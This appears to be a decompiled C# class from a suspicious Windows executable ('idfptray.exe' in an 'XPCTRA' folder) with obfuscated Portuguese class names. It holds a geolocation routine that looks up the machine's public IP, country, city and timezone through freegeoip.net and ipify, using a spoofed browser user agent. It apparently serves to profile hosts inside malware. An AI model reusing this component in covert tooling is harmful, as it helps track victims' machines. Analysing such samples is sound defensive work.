// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Helper.AMADELEITE205CACADOTES
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.IO;
using System.Net;
using System.Xml;
using VERMELHO265MONARCA.Core.Data;

namespace VERMELHO265MONARCA.Core.Helper
{
  public static class AMADELEITE205CACADOTES
  {
    public static readonly string[] ImageList = new string[247]
    {
      "ad",
      "ae",
      "af",
      "ag",
      "ai",
      "al",
      "am",
      "an",
      "ao",
      "ar",
      "as",
      "at",
      "au",
      "aw",
      "ax",
      "az",
      "ba",
      "bb",
      "bd",
      "be",
      "bf",
      "bg",
      "bh",
      "bi",
      "bj",
      "bm",
      "bn",
      "bo",
      "br",
      "bs",
      "bt",
      "bv",
      "bw",
      "by",
      "bz",
      "ca",
      "catalonia",
      "cc",
      "cd",
      "cf",
      "cg",
      "ch",
      "ci",
      "ck",
      "cl",
      "cm",
      "cn",
      "co",
      "cr",
      "cs",
      "cu",
      "cv",
      "cx",
      "cy",
      "cz",
      "de",
      "dj",
      "dk",
      "dm",
      "do",
      "dz",
      "ec",
      "ee",
      "eg",
      "eh",
      "england",
      "er",
      "es",
      "et",
      "europeanunion",
      "fam",
      "fi",
      "fj",
      "fk",
      "fm",
      "fo",
      "fr",
      "ga",
      "gb",
      "gd",
      "ge",
      "gf",
      "gh",
      "gi",
      "gl",
      "gm",
      "gn",
      "gp",
      "gq",
      "gr",
      "gs",
      "gt",
      "gu",
      "gw",
      "gy",
      "hk",
      "hm",
      "hn",
      "hr",
      "ht",
      "hu",
      "id",
      "ie",
      "il",
      "in",
      "io",
      "iq",
      "ir",
      "is",
      "it",
      "jm",
      "jo",
      "jp",
      "ke",
      "kg",
      "kh",
      "ki",
      "km",
      "kn",
      "kp",
      "kr",
      "kw",
      "ky",
      "kz",
      "la",
      "lb",
      "lc",
      "li",
      "lk",
      "lr",
      "ls",
      "lt",
      "lu",
      "lv",
      "ly",
      "ma",
      "mc",
      "md",
      "me",
      "mg",
      "mh",
      "mk",
      "ml",
      "mm",
      "mn",
      "mo",
      "mp",
      "mq",
      "mr",
      "ms",
      "mt",
      "mu",
      "mv",
      "mw",
      "mx",
      "my",
      "mz",
      "na",
      "nc",
      "ne",
      "nf",
      "ng",
      "ni",
      "nl",
      "no",
      "np",
      "nr",
      "nu",
      "nz",
      "om",
      "pa",
      "pe",
      "pf",
      "pg",
      "ph",
      "pk",
      "pl",
      "pm",
      "pn",
      "pr",
      "ps",
      "pt",
      "pw",
      "py",
      "qa",
      "re",
      "ro",
      "rs",
      "ru",
      "rw",
      "sa",
      "sb",
      "sc",
      "scotland",
      "sd",
      "se",
      "sg",
      "sh",
      "si",
      "sj",
      "sk",
      "sl",
      "sm",
      "sn",
      "so",
      "sr",
      "st",
      "sv",
      "sy",
      "sz",
      "tc",
      "td",
      "tf",
      "tg",
      "th",
      "tj",
      "tk",
      "tl",
      "tm",
      "tn",
      "to",
      "tr",
      "tt",
      "tv",
      "tw",
      "tz",
      "ua",
      "ug",
      "um",
      "us",
      "uy",
      "uz",
      "va",
      "vc",
      "ve",
      "vg",
      "vi",
      "vn",
      "vu",
      "wales",
      "wf",
      "ws",
      "ye",
      "yt",
      "za",
      "zm",
      "zw"
    };

    public static int ImageIndex { get; set; }

    public static InformçaoGerais GeoInfo { get; private set; }

    public static DateTime LastLocated { get; private set; }

    public static bool LocationCompleted { get; private set; }

    static AMADELEITE205CACADOTES()
    {
      AMADELEITE205CACADOTES.LastLocated = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);
    }

    public static void Initialize()
    {
      TimeSpan timeSpan;
      // ISSUE: explicit reference operation
      // ISSUE: variable of a reference type
      TimeSpan& local = @timeSpan;
      DateTime dateTime = DateTime.UtcNow;
      long ticks1 = dateTime.Ticks;
      dateTime = AMADELEITE205CACADOTES.LastLocated;
      long ticks2 = dateTime.Ticks;
      long ticks3 = ticks1 - ticks2;
      // ISSUE: explicit reference operation
      ^local = new TimeSpan(ticks3);
      if (timeSpan.TotalMinutes <= 30.0 && AMADELEITE205CACADOTES.LocationCompleted)
        return;
      AMADELEITE205CACADOTES.TryLocateFallback();
      if (string.IsNullOrEmpty(AMADELEITE205CACADOTES.GeoInfo.CountryCode) || string.IsNullOrEmpty(AMADELEITE205CACADOTES.GeoInfo.Country))
      {
        AMADELEITE205CACADOTES.ImageIndex = 247;
      }
      else
      {
        for (int index = 0; index < AMADELEITE205CACADOTES.ImageList.Length; ++index)
        {
          if (AMADELEITE205CACADOTES.ImageList[index] == AMADELEITE205CACADOTES.GeoInfo.CountryCode.ToLower())
          {
            AMADELEITE205CACADOTES.ImageIndex = index;
            break;
          }
        }
      }
    }

    private static void TryLocateFallback()
    {
      AMADELEITE205CACADOTES.GeoInfo = new InformçaoGerais();
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://freegeoip.net/xml/");
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
        httpWebRequest.Proxy = (IWebProxy) null;
        httpWebRequest.Timeout = 10000;
        using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
        {
          using (Stream responseStream = response.GetResponseStream())
          {
            using (StreamReader streamReader = new StreamReader(responseStream))
            {
              string end = streamReader.ReadToEnd();
              XmlDocument xmlDocument = new XmlDocument();
              xmlDocument.LoadXml(end);
              string innerXml1 = xmlDocument.SelectSingleNode("Response//IP").InnerXml;
              string innerXml2 = xmlDocument.SelectSingleNode("Response//CountryName").InnerXml;
              string innerXml3 = xmlDocument.SelectSingleNode("Response//CountryCode").InnerXml;
              string innerXml4 = xmlDocument.SelectSingleNode("Response//RegionName").InnerXml;
              string innerXml5 = xmlDocument.SelectSingleNode("Response//City").InnerXml;
              string innerXml6 = xmlDocument.SelectSingleNode("Response//TimeZone").InnerXml;
              AMADELEITE205CACADOTES.GeoInfo.Ip = !string.IsNullOrEmpty(innerXml1) ? innerXml1 : "-";
              AMADELEITE205CACADOTES.GeoInfo.Country = !string.IsNullOrEmpty(innerXml2) ? innerXml2 : "Unknown";
              AMADELEITE205CACADOTES.GeoInfo.CountryCode = !string.IsNullOrEmpty(innerXml3) ? innerXml3 : "-";
              AMADELEITE205CACADOTES.GeoInfo.Region = !string.IsNullOrEmpty(innerXml4) ? innerXml4 : "Unknown";
              AMADELEITE205CACADOTES.GeoInfo.City = !string.IsNullOrEmpty(innerXml5) ? innerXml5 : "Unknown";
              AMADELEITE205CACADOTES.GeoInfo.Timezone = !string.IsNullOrEmpty(innerXml6) ? innerXml6 : "Unknown";
              AMADELEITE205CACADOTES.GeoInfo.Isp = "Unknown";
            }
          }
        }
        AMADELEITE205CACADOTES.LastLocated = DateTime.UtcNow;
        AMADELEITE205CACADOTES.LocationCompleted = true;
      }
      catch
      {
        AMADELEITE205CACADOTES.GeoInfo.Country = "Unknown";
        AMADELEITE205CACADOTES.GeoInfo.CountryCode = "-";
        AMADELEITE205CACADOTES.GeoInfo.Region = "Unknown";
        AMADELEITE205CACADOTES.GeoInfo.City = "Unknown";
        AMADELEITE205CACADOTES.GeoInfo.Timezone = "Unknown";
        AMADELEITE205CACADOTES.GeoInfo.Isp = "Unknown";
        AMADELEITE205CACADOTES.LocationCompleted = false;
      }
      if (!string.IsNullOrEmpty(AMADELEITE205CACADOTES.GeoInfo.Ip))
        return;
      AMADELEITE205CACADOTES.TryGetWanIp();
    }

    private static void TryGetWanIp()
    {
      string str = "-";
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://api.ipify.org/");
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
        httpWebRequest.Proxy = (IWebProxy) null;
        httpWebRequest.Timeout = 5000;
        using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
        {
          using (Stream responseStream = response.GetResponseStream())
          {
            using (StreamReader streamReader = new StreamReader(responseStream))
              str = streamReader.ReadToEnd();
          }
        }
      }
      catch (Exception ex)
      {
      }
      AMADELEITE205CACADOTES.GeoInfo.Ip = str;
    }
  }
}
